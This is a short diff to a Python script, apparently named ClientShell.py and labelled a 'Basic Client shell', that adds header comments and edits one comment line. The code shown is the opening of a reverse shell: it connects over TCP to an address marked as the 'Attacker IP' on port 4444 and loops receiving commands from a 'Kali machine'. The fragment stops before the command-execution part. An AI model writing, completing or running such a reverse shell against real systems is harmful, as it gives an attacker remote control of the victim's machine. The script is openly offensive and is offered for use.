@@ -1,9 +1,13 @@
+# www.UpdateLap.com
+# Basic Client shell 
+# use python 3: python3 ClientShell.py
+
 import socket # For Building TCP Connection
 import subprocess # To start the shell in the system
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' 
-    s.connect(('10.10.10.10', 4444)) # Here we define the Attacker IP and the listening port
+    s.connect(('10.10.10.10', 4444)) # Here we define the ""Attacker"" IP and the listening port
 
     while True: # keep receiving commands from the Kali machine
         command = s.recv(1024) # read the first KB of the tcp socket
